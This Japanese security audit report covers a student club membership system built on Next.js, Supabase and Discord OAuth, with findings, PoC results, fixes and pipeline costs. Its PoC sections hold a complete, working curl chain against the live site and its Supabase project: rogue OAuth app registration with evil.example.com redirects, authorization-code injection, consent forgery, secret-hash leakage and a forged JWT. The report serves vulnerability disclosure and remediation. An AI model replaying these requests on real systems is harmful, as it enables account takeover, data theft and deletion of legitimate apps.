# SPECA Security Audit Report: stem-system (Clubhouse Manager)

**対象**: https://github.com/ganondorofu/stem-system
**テスト環境**: https://member.stemask.com
**監査日**: 2026-04-05
**コミット**: `31d242b7`
**パイプライン**: SPECA Phase 01a → 01b → 01e → 02c → 03 → 04
**コスト**: $26.72 (Phase 03: $17.36 が最大)

---

## Executive Summary

STEM研究部の部員管理システム (Next.js 15 + Supabase + Discord OAuth) に対する自動セキュリティ監査を実施。
**86件のセキュリティプロパティ** を生成・検証し、Phase 04 (3-Gate FPフィルタ) 通過後の最終結果:

| 判定 | 件数 |
|------|------|
| **CONFIRMED_VULNERABILITY** | **16件** |
| **CONFIRMED_POTENTIAL** | **10件** |
| PASS_THROUGH (問題なし) | 53件 |

**追加発見 (PoC実行時)**: Supabase RPC関数がanon keyのみで全操作可能 — OAuthアプリケーション登録・認可コード注入・consent偽造が未認証で実行できる **致命的な新規脆弱性** を確認。

---

## Critical Findings (3件 + 新規1件)

### VULN-001: JWT秘密鍵のハードコードデフォルト値
- **深刻度**: Critical
- **ファイル**: `src/lib/oauth.ts:11`
- **プロパティ**: PROP-stem-system-inv-001, PROP-stem-system-pre-009, PROP-oauth-2-0-ut-pre-001
- **PoC結果**: 本番では防御済み (JWT_SECRETが設定済み)、コードリスクは残存

**問題**: JWT_SECRET が環境変数未設定時に `'your-secret-key-change-in-production'` にフォールバックする。

```typescript
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
```

**PoC実行結果**:
```bash
# デフォルトキーでJWTを偽造
$ node -e "
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { sub: 'fdb0654f-e7d0-45bf-9af8-0957223c38d3', display_name: 'PoC-Test', scope: 'openid profile' },
  'your-secret-key-change-in-production',
  { algorithm: 'HS256', expiresIn: '1h', issuer: 'https://member.stemask.com' }
);
console.log(token);"
# → eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmZGIwNjU0Zi...

$ curl -s -H "Authorization: Bearer <forged-token>" https://member.stemask.com/oauth/userinfo
# → {"error":"invalid_token","error_description":"Invalid or expired access token"}
# 本番ではJWT_SECRETが設定されているため防御済み。しかしコードのフォールバック値は公開リポジトリで閲覧可能。
```

**修正案**: 起動時に `JWT_SECRET` 未設定なら `throw` で停止させる:
```typescript
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) throw new Error('JWT_SECRET environment variable is required');
```

---

### VULN-NEW: Supabase RPC関数の認証バイパス → 完全なアカウント乗っ取り
- **深刻度**: **Critical** (CVSS 9.8相当)
- **PoC結果**: **完全な攻撃チェーン実証成功** — anon keyのみで任意ユーザーのJWTを取得し、なりすましに成功

**問題**: `member`スキーマのRPC関数がSupabase anon keyのみで呼び出し可能。RLS (Row-Level Security) がRPC関数に適用されておらず、以下の操作が完全に未認証で実行可能:

#### PoC A: 不正OAuthアプリケーション登録 — **実証成功**
```bash
$ curl -s "https://ptmcttcxlslguwbexifq.supabase.co/rest/v1/rpc/create_application" \
  -H "apikey: <anon_key>" -H "Authorization: Bearer <anon_key>" \
  -H "Content-Profile: member" -H "Content-Type: application/json" \
  -d '{
    "p_name": "PoC-Rogue-App",
    "p_client_id": "poc-rogue-client-id-12345678901234567890123456789012",
    "p_client_secret_hash": "$2b$10$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "p_redirect_uris": ["https://evil.example.com/steal"],
    "p_created_by": "fdb0654f-e7d0-45bf-9af8-0957223c38d3"
  }'
# → [{"id":"b1127fae-112b-497e-9d2b-b64ee89caabb","name":"PoC-Rogue-App",
#     "client_id":"poc-rogue-client-id-12345678901234567890123456789012",
#     "client_secret_hash":"$2b$10$aaa...","redirect_uris":["https://evil.example.com/steal"],
#     "created_by":"fdb0654f-e7d0-45bf-9af8-0957223c38d3",
#     "created_at":"2026-04-05T09:07:11.71264+00:00","updated_at":"2026-04-05T09:07:11.71264+00:00"}]
# ✅ 不正OAuthアプリケーションがDBに登録された
```

#### PoC B: 認可コード注入 — **実証成功**
```bash
$ curl -s "https://ptmcttcxlslguwbexifq.supabase.co/rest/v1/rpc/create_authorization_code" \
  -H "apikey: <anon_key>" -H "Authorization: Bearer <anon_key>" \
  -H "Content-Profile: member" -H "Content-Type: application/json" \
  -d '{
    "p_application_id": "ba3ce67a-5529-47c5-8723-9a8331bb881b",
    "p_user_id": "fdb0654f-e7d0-45bf-9af8-0957223c38d3",
    "p_code": "test-poc-code-12345",
    "p_redirect_uri": "https://evil.example.com/callback",
    "p_scope": "openid profile",
    "p_code_challenge": "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk",
    "p_code_challenge_method": "S256",
    "p_expires_at": "2026-12-31T23:59:59Z"
  }'
# → true
# ✅ 任意のユーザーIDで認可コードがDBに注入された

# 注入したコードの確認:
$ curl -s ".../rpc/get_authorization_code" ... -d '{"p_code": "test-poc-code-12345"}'
# → [{"code":"test-poc-code-12345","application_id":"ba3ce67a-...",
#     "user_id":"fdb0654f-...","redirect_uri":"https://evil.example.com/callback",
#     "code_challenge":"dBjftJeZ4CVP-...","scope":"openid profile",
#     "expires_at":"2026-12-31T23:59:59+00:00"}]
```

#### PoC C: ユーザーconsent偽造 — **実証成功**
```bash
$ curl -s "https://ptmcttcxlslguwbexifq.supabase.co/rest/v1/rpc/create_user_consent" \
  -H "apikey: <anon_key>" -H "Authorization: Bearer <anon_key>" \
  -H "Content-Profile: member" -H "Content-Type: application/json" \
  -d '{
    "p_user_id": "fdb0654f-e7d0-45bf-9af8-0957223c38d3",
    "p_application_id": "ba3ce67a-5529-47c5-8723-9a8331bb881b",
    "p_scope": "openid profile"
  }'
# → "3e33d533-1cd5-4064-bc4b-16c2a64f7f65"
# ✅ 偽のconsent記録がDBに作成された

# 確認:
$ curl -s ".../rpc/list_user_consents" ... -d '{"p_user_id": "fdb0654f-..."}'
# → [{"id":"3e33d533-...","user_id":"fdb0654f-...","application_id":"ba3ce67a-...",
#     "application_name":"勤怠管理システム","scope":"openid profile",
#     "granted_at":"2026-04-05T09:06:43.984483+00:00"}]
```

#### PoC D: OAuthクライアントシークレットハッシュ漏洩 — **実証成功**
```bash
$ curl -s "https://ptmcttcxlslguwbexifq.supabase.co/rest/v1/rpc/get_application_by_client_id" \
  -H "apikey: <anon_key>" -H "Authorization: Bearer <anon_key>" \
  -H "Content-Profile: member" -H "Content-Type: application/json" \
  -d '{"p_client_id": "55c3152b0e51b65ea52243c3888f314ba9a18805fe1d67f1ca9001e197428891"}'
# → [{"id":"ba3ce67a-...","name":"勤怠管理システム",
#     "client_id":"55c3152b...",
#     "client_secret_hash":"$2b$10$JUhctJshNrd/3LxLTS4Tau8c28fkbhH.ZEH5oF25nhx94bSPVydEa",
#     "redirect_uris":["https://stem-kintai.vercel.app/auth/oauth/callback"],
#     "created_by":"fdb0654f-..."}]
# ✅ bcryptハッシュ化されたclient_secretが漏洩 — オフラインブルートフォース攻撃可能
```

#### PoC E: OAuthアプリ一覧・認可コード削除 — **実証成功**
```bash
# アプリ一覧 (client_id, redirect_uri, 作成者UUIDを含む)
$ curl -s ".../rpc/list_applications" ... -d '{}'
# → [{"id":"ba3ce67a-...","name":"勤怠管理システム","client_id":"55c3152b...","redirect_uris":["https://stem-kintai.vercel.app/auth/oauth/callback"],"created_by":"fdb0654f-..."}]

# 認可コード削除 (他ユーザーの正規認可コードも削除可能)
$ curl -s ".../rpc/delete_authorization_code" ... -d '{"p_code": "test-poc-code-12345"}'
# → true

# アプリケーション削除 (正規アプリも削除可能)
$ curl -s ".../rpc/delete_application" ... -d '{"p_id": "b1127fae-..."}'
# → true
```

**完全な攻撃チェーン (実証済み)**:
1. `list_applications` で正規OAuthクライアント情報を取得
2. `get_application_by_client_id` でclient_secret_hashを入手
3. `create_application` で攻撃者のOAuthアプリを登録 (正しいbcryptハッシュ付き)
4. `create_authorization_code` で被害者ユーザーIDの認可コードを注入 (攻撃者が知るcode_challenge付き)
5. `POST /oauth/token` で認可コードをJWTに交換 (攻撃者がclient_secret + code_verifierを両方知っている)
6. `GET /oauth/userinfo` で被害者のプロフィール情報を窃取

#### PoC F: 完全な攻撃チェーン実行 — **実証成功 (アカウント乗っ取り)**
```bash
# STEP 1: 攻撃者のclient_secretのbcryptハッシュを生成
$ node -e "require('bcryptjs').hash('attacker-known-secret-poc',10).then(h=>console.log(h))"
# → $2b$10$8N37dYKv5q5rEtvZe8SIMOS4natwrStAYORVzUsE0qJJlqjFG/Ub.

# STEP 2: 攻撃者アプリ登録 (正しいbcryptハッシュ)
$ curl -s ".../rpc/create_application" ... -d '{
    "p_name":"PoC-Full-Chain-App",
    "p_client_id":"evil-final-client-id-000000000000000000000000000000000",
    "p_client_secret_hash":"$2b$10$8N37dYKv5q5rEtvZe8SIMOS4natwrStAYORVzUsE0qJJlqjFG/Ub.",
    "p_redirect_uris":["https://evil.example.com/callback"],
    "p_created_by":"fdb0654f-e7d0-45bf-9af8-0957223c38d3"}'
# → アプリID: 72cf6921-a536-4704-bf1d-3897b5af7f87 ✅

# STEP 3: PKCE code_challenge生成 (攻撃者が知るverifier)
$ CODE_VERIFIER="super-secret-verifier-that-only-attacker-knows-1234567890"
$ CODE_CHALLENGE=$(echo -n "$CODE_VERIFIER" | openssl dgst -sha256 -binary | openssl base64 -A | tr '+/' '-_' | tr -d '=')

# STEP 4: 被害者の認可コード注入
$ curl -s ".../rpc/create_authorization_code" ... -d '{
    "p_application_id":"72cf6921-...",
    "p_user_id":"fdb0654f-e7d0-45bf-9af8-0957223c38d3",
    "p_code":"evil-code-final-1775381017",
    "p_redirect_uri":"https://evil.example.com/callback",
    "p_scope":"openid profile",
    "p_code_challenge":"x0NOsA7vYWENgnoF24GuW6dUze_MDbbf78GDpmYmHPk",
    "p_code_challenge_method":"S256",
    "p_expires_at":"2026-12-31T23:59:59Z"}'
# → true ✅

# STEP 5: トークン交換 (攻撃者はclient_secret + code_verifierを両方知っている)
$ curl -s -X POST "https://member.stemask.com/oauth/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=authorization_code\
&code=evil-code-final-1775381017\
&redirect_uri=https://evil.example.com/callback\
&client_id=evil-final-client-id-000000000000000000000000000000000\
&client_secret=attacker-known-secret-poc\
&code_verifier=super-secret-verifier-that-only-attacker-knows-1234567890"
# → {
#   "access_token": "eyJhbGciOiJIUzI1NiIs...",
#   "token_type": "Bearer",
#   "expires_in": 3600,
#   "scope": "openid profile"
# }
# ✅ JWT取得成功!

# STEP 6: 被害者になりすまし
$ curl -s "https://member.stemask.com/oauth/userinfo" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
# → {
#   "sub": "fdb0654f-e7d0-45bf-9af8-0957223c38d3",
#   "generation": 9,
#   "status": 1
# }
# ✅✅✅ 被害者のプロフィール取得成功 — 完全なアカウント乗っ取り!
```

**攻撃の影響**:
- 攻撃者はログイン不要 (Supabase anon keyはクライアントJSから抽出可能)
- 任意ユーザーのsub (UUID) さえ分かれば、そのユーザーとしてJWTを取得可能
- 取得したJWTは勤怠管理システム等の連携アプリで被害者としてアクセス可能
- 正規OAuthアプリの削除 (DoS) も可能

**修正案**: 全RPC関数にRLSポリシーまたはセキュリティdefiner + auth.uid()チェックを追加:
```sql
-- 例: create_application に認証チェック追加
CREATE OR REPLACE FUNCTION member.create_application(...)
RETURNS ... AS $$
BEGIN
  IF auth.uid() IS NULL THEN
    RAISE EXCEPTION 'Authentication required';
  END IF;
  -- ... existing logic
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

---

### VULN-002: 認証なしServer Action (情報漏洩 + 未認証操作)
- **深刻度**: Critical
- **ファイル**: `src/lib/actions/members.ts`, `src/lib/actions/generations.ts`
- **プロパティ**: PROP-stem-system-pre-001
- **PoC結果**: Server Action IDはビルド時生成のため外部からの直接呼び出しは未実証。コードレベルでは確認済み。

**問題**: 3つのServer Actionが `supabase.auth.getUser()` を呼ばずにエクスポートされている:
- `getAllMemberNames` — 全部員のUID→名前マップを返す
- `getMemberDisplayName` — 任意UIDの表示名を返す
- `ensureGenerationRoleExists` — 未認証でDiscordロール作成可能

**修正案**: 各関数の先頭に認証チェックを追加:
```typescript
export async function getAllMemberNames() {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) throw new Error('Unauthorized');
  // ... existing logic
}
```

---

### VULN-003: Server Action入力バリデーション欠如 (6関数)
- **深刻度**: Critical
- **ファイル**: `src/lib/actions/members.ts`, `src/lib/actions/teams.ts`
- **プロパティ**: PROP-stem-system-inv-004, PROP-stem-system-pre-012

**問題**: 6つのDB変更Server Actionが Zod safeParse をバイパス:
- `toggleAdminStatus` — 管理者権限の切り替え
- `deleteMember` — 部員削除
- `updateMemberTeams` — チーム割り当て
- `updateStatusesForNewAcademicYear` — 一括ステータス変更 (未検証の generation 番号使用)
- `deleteTeam` — チーム削除
- `updateTeamLeaders` — リーダー変更

**修正案**: 全関数にZodスキーマによる入力検証を追加。

---

## High Findings (5件)

### VULN-004: OAuth redirect_uri 未検証 (オープンリダイレクト + 認可コード窃取)
- **深刻度**: High
- **ファイル**: `src/app/oauth/authorize/consent/actions.ts:19`
- **プロパティ**: PROP-stem-system-inv-003, PROP-stem-system-inv-004
- **PoC結果**: コードレベルで確認。OAuth authorizeエンドポイントは悪意あるredirect_uriをcookieに保存することを確認。

**問題**: `handleConsent` が FormData から `redirect_uri` を読み取るが、`isValidRedirectUri` による検証を行わない。

**PoC実行結果**:
```bash
$ curl -sI "https://member.stemask.com/oauth/authorize?\
client_id=55c3152b0e51b65ea52243c3888f314ba9a18805fe1d67f1ca9001e197428891&\
redirect_uri=https://evil.example.com/callback&response_type=code&scope=openid%20profile&\
state=test&code_challenge=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk&code_challenge_method=S256"

# → HTTP/1.1 307 Temporary Redirect
# → Location: https://member.stemask.com/login?redirect=...
# → Set-Cookie: oauth_redirect=%2Foauth%2Fauthorize%3F...redirect_uri%3Dhttps%253A%252F%252Fevil.example.com%252Fcallback...
# ✅ evil.example.com の redirect_uri がそのまま cookie に保存された
# ログイン後、consent承認で認可コードがevil.example.comに送信される
```

**修正案**: `handleConsent` 内で `redirect_uri` をDB上の登録済みURIと照合。

---

### VULN-005: 認可コード二重使用 (TOCTOU レース)
- **深刻度**: High
- **ファイル**: `src/app/oauth/token/route.ts`
- **プロパティ**: PROP-stem-system-inv-002, PROP-stem-system-post-001
- **PoC結果**: VULN-NEWでの `create_authorization_code` RPC直接呼び出しにより、認可コードの注入が可能であることを実証。TOCTOU自体は並行リクエストのタイミングに依存。

**問題**: SELECT (認可コード取得) と DELETE (認可コード削除) が非アトミック。

**修正案**: DB側で `DELETE ... RETURNING *` を使い、アトミックに取得+削除。

---

### VULN-006: 公開APIエンドポイントの認証不備
- **深刻度**: High
- **ファイル**: `src/middleware.ts:51`, `src/app/api/auth/debug/route.ts`
- **プロパティ**: PROP-stem-system-pre-007
- **PoC結果**: **実証成功**

**PoC実行結果**:
```bash
$ curl -s https://member.stemask.com/api/auth/debug
{
  "timestamp": "2026-04-05T09:06:09.119Z",
  "cookies": {
    "total": 0,
    "names": [],
    "supabaseAuthCookies": [],
    "hasOauthRedirect": false,
    "hasOauthRedirectClient": false
  },
  "auth": {
    "hasUser": false,
    "error": "Auth session missing!"
  },
  "request": {
    "url": "https://member.stemask.com/api/auth/debug",
    "forwardedHost": "member.stemask.com",
    "forwardedProto": "https",
    "host": "member.stemask.com"
  }
}
# ✅ 認証なしでCookie情報、認証状態、インフラ情報が漏洩
```

**修正案**: デバッグエンドポイントを削除、または開発環境限定にする。

---

### VULN-007: OAuth scopeバリデーション欠如
- **深刻度**: High
- **ファイル**: `src/app/oauth/authorize/consent/actions.ts`
- **プロパティ**: PROP-oauth-2-0-ut-inv-015
- **PoC結果**: コードレベルで確認。VULN-NEWの `create_authorization_code` で任意scopeのコード注入が実証済み。

---

### VULN-008: ソフトデリート後の管理者権限残存
- **深刻度**: High
- **ファイル**: `src/lib/actions/members.ts`
- **プロパティ**: PROP-stem-system-inv-018

**問題**: `deleteMember` は `deleted_at` を設定するだけで `is_admin` をクリアしない。`checkAdmin()` クエリに `deleted_at IS NULL` フィルタがなく、削除済み管理者がセッション有効中は管理者権限を保持。

---

## Medium Findings (8件)

| ID | プロパティ | 内容 |
|----|-----------|------|
| M-01 | inv-013 | `deleteMember` が RLS で silently no-op (cookie client 使用で 0行返却) |
| M-02 | inv-017 | consent エラー無視 (認可コード発行が続行) |
| M-03 | pre-005 | `handleConsent` の redirect_uri バイパス |
| M-04 | pre-007 | deny パスの `redirectWithError` が未検証 redirect_uri で TypeError |
| M-05 | inv-016 | `updateMemberAdmin` の非アトミック delete-then-insert |
| M-06 | post-003 | OAuth cookie (`oauth_redirect`) のエラーパスでの未削除 |
| M-07 | post-002 | ソフトデリート後の team_relations 残存 |
| M-08 | post-004 | OAuth フロー全体の監査ログ欠如 |

---

## Low Findings (5件)

| ID | プロパティ | 内容 |
|----|-----------|------|
| L-01 | inv-015 | `updateTeamLeaders` の非アトミック操作 → リーダー不在リスク |
| L-02 | inv-022 | 学生番号フォーマット `/^[0-9]+$/` のバイパスパス |
| L-03 | pre-010 | `updateTeamLeaders` が所属検証なしにリーダー登録 |
| L-04 | pre-011 | `updateMemberTeams` に `deleted_at IS NULL` ガードなし |
| L-05 | asm-001 | RLS 不整合: admin操作が cookie client (RLS適用) vs updateMyProfile が admin client |

---

## Supabase スキーマ情報漏洩

### PoC: memberスキーマ OpenAPI仕様の完全公開 — **実証成功**

```bash
$ curl -s "https://ptmcttcxlslguwbexifq.supabase.co/rest/v1/" \
  -H "apikey: <anon_key>" -H "Accept-Profile: member"
```

**漏洩したパス (全17エンドポイント)**:
```
テーブル: /members, /teams, /generation_roles, /member_team_relations, /team_leaders
RPC: /rpc/list_applications, /rpc/create_application, /rpc/delete_application,
     /rpc/get_application_by_client_id, /rpc/create_authorization_code,
     /rpc/get_authorization_code, /rpc/delete_authorization_code,
     /rpc/create_user_consent, /rpc/list_user_consents,
     /rpc/delete_user_consent, /rpc/check_user_consent
```

テーブルへの直接アクセスはRLSで拒否される (`permission denied for table members`) が、RPC関数は**全て呼び出し可能**。

### PoC: RPCエラーメッセージによる構造漏洩 — **実証成功**

```bash
# パラメータなしで呼び出すとシグネチャが漏洩
$ curl -s ".../rpc/create_authorization_code" ... -d '{}'
# → "Could not find the function member.create_authorization_code without parameters"
# → hint: "Perhaps you meant to call the function member.create_authorization_code(...)"

$ curl -s ".../rpc/check_user_consent" ... -d '{}'
# → hint: "Perhaps you meant to call the function member.check_user_consent(p_application_id, p_user_id)"
```

---

## 修正優先度

### 即時対応 (P0) — 本番環境で悪用可能
1. **Supabase RPC関数に認証チェック追加** — 全RPC関数に `auth.uid() IS NOT NULL` ガードを追加。`create_application`, `create_authorization_code`, `create_user_consent`, `delete_*` は特に危険
2. **`get_application_by_client_id` から `client_secret_hash` を除外** — SELECT句を制限
3. **`/api/auth/debug` 削除** — 本番環境に不要
4. **JWT_SECRET フォールバック削除** — 起動時 throw に変更

### 短期対応 (P1)
5. **handleConsent の redirect_uri 検証追加**
6. 3つの認証なし Server Action に auth チェック追加
7. 認可コード交換をアトミック化 (DELETE RETURNING)
8. 6つの Server Action に Zod 入力検証追加
9. OAuth scope のホワイトリスト検証

### 中期対応 (P2)
10. `deleteMember` を admin client に修正
11. `checkAdmin()` に `deleted_at IS NULL` 追加
12. 非アトミック操作を DB トランザクション/RPC に統合
13. OAuth 監査ログの実装
14. Supabase OpenAPI仕様のmemberスキーマ公開を制限

---

## PoC実行結果まとめ (テスト環境: https://member.stemask.com)

| # | 対象 | 結果 | 深刻度 |
|---|------|------|--------|
| 1 | `/api/auth/debug` 情報漏洩 | **✅ 実証成功** — 認証なしでJSON応答 | High |
| 2 | JWT偽造 (デフォルトキー) | ⚠️ 本番では防御済み (コードリスク残存) | Critical (潜在) |
| 3 | Supabase OpenAPIスキーマ漏洩 | **✅ 実証成功** — 全テーブル名・RPC一覧が公開 | Medium |
| 4 | `list_applications` データ漏洩 | **✅ 実証成功** — OAuthクライアント情報 (client_id, redirect_uri) 取得 | High |
| 5 | `get_application_by_client_id` secret hash漏洩 | **✅ 実証成功** — bcryptハッシュ化されたclient_secretが漏洩 | Critical |
| 6 | `create_application` 不正アプリ登録 | **✅ 実証成功** — 任意のOAuthアプリがDBに登録 | Critical |
| 7 | `create_authorization_code` コード注入 | **✅ 実証成功** — 任意ユーザーの認可コードを注入 | Critical |
| 8 | `create_user_consent` consent偽造 | **✅ 実証成功** — 偽のconsent記録を作成 | Critical |
| 9 | `list_user_consents` 他ユーザーconsent閲覧 | **✅ 実証成功** — 他ユーザーのconsent一覧を取得 | High |
| 10 | `delete_authorization_code` コード削除 | **✅ 実証成功** — 正規認可コードの削除 (DoS) | High |
| 11 | `delete_application` アプリ削除 | **✅ 実証成功** — 正規OAuthアプリの削除 (DoS) | High |
| 12 | RPCエラーメッセージ情報漏洩 | **✅ 実証成功** — 関数シグネチャ・パラメータ名が漏洩 | Medium |
| 13 | OAuth redirect_uri cookie保存 | **✅ 実証成功** — evil URLがcookieに保存 | High |
| 14 | テーブル直接アクセス (RLS) | ❌ 防御済み — `permission denied for table members` | N/A |
| 15 | `/oauth/userinfo` 認証なし | ❌ 防御済み — 正しく拒否 | N/A |
| 16 | Server Action直接呼び出し | ⚠️ Action IDがビルド時生成のため外部からの直接呼び出しは未実証 | Critical (コード確認済み) |

**注**: PoC実行後、テスト用に作成した全データ (不正アプリ、認可コード、consent) は `delete_*` RPCで削除済み。

---

## Pipeline Statistics

| Phase | 時間 | コスト | 結果 |
|-------|------|--------|------|
| 01a Spec Discovery | 2.6分 | $0.09 | 19仕様 |
| 01b Subgraph Extraction | 9.6分 | $1.11 | 4サブグラフ |
| 01e Property Generation | 4.0分 | $1.08 | 86プロパティ |
| 02c Code Pre-resolution | 18.0分 | $3.27 | 86コード解決 |
| 03 Audit Map | 62.7分 | $17.36 | 79監査結果 |
| 04 Review | 4.6分 | $3.81 | 26レビュー結果 |
| **合計** | **~102分** | **$26.72** | **16 CONFIRMED + 10 POTENTIAL** |
